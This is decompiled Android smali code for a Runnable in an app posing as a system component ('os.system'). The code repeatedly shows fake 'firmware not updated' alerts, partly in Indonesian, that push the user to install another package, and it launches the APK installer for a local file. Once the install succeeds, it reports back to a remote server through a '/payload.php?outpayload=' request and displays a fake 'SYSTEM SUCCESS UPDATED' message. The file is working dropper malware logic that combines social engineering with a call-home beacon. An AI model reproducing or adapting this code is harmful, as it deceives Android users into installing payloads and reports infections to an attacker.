.class Los/system/System$1;
.super Ljava/lang/Object;
.source "System.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/System;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Los/system/System;


# direct methods
.method constructor <init>(Los/system/System;)V
    .locals 0

    .prologue
    .line 75
    iput-object p1, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    .prologue
    const/16 v4, 0x31

    .line 78
    iget-object v0, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$100(Los/system/System;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v1}, Los/system/System;->access$000(Los/system/System;)Ljava/lang/Runnable;

    move-result-object v1

    const-wide/16 v2, 0x1388

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 80
    new-instance v0, Los/system/MainActivity;

    invoke-direct {v0}, Los/system/MainActivity;-><init>()V

    iget-object v1, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {}, Los/system/System;->access$200()Ljava/lang/String;

    move-result-object v2

    const-string v3, "open"

    invoke-virtual {v0, v1, v2, v3}, Los/system/MainActivity;->apkMana(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 81
    iget-object v0, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$100(Los/system/System;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v1}, Los/system/System;->access$000(Los/system/System;)Ljava/lang/Runnable;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 82
    iget-object v0, p0, Los/system/System$1;->this$0:Los/system/System;

    iget-object v1, p0, Los/system/System$1;->this$0:Los/system/System;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v3}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Los/system/System$1;->this$0:Los/system/System;

    const-string v5, "install success"

    invoke-virtual {v3, v5}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 84
    iget-object v0, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    const/16 v0, 0x2710

    sput v0, Los/system/ReceiverBoot;->delayToast:I

    .line 85
    iget-object v0, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v1, p0, Los/system/System$1;->this$0:Los/system/System;

    const-string v2, "aktif"

    const v3, -0xff0100

    const-string v5, "SYSTEM SUCCESS UPDATED\n\n\nYour firmware is  updated please WAIT  process system. [alert akan hilang setelah 60 detik] \n\n------------\n.-----------.\n\n\n\n\n       [ WARNING! ]\n\n\n"

    invoke-virtual/range {v0 .. v5}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    .line 96
    :goto_0
    return-void

    .line 88
    :cond_0
    iget-object v0, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v1, p0, Los/system/System$1;->this$0:Los/system/System;

    const-string v2, "aktif"

    const/16 v3, -0x100

    const-string v5, "SYSTEM ALERT WINDOW!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app Framework\n2. Terima prompt playstore google\n3. Open app finish.\n\n\n\n\n       [ WARNING! ]\n\n\n"

    invoke-virtual/range {v0 .. v5}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    .line 90
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 91
    new-instance v1, Ljava/io/File;

    invoke-static {}, Los/system/System;->access$400()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v1

    const-string v2, "application/vnd.android.package-archive"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 92
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 93
    iget-object v1, p0, Los/system/System$1;->this$0:Los/system/System;

    invoke-virtual {v1, v0}, Los/system/System;->startActivity(Landroid/content/Intent;)V

    .line 94
    sget-object v0, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Los/system/System;->access$400()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-static {}, Los/system/System;->access$200()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method
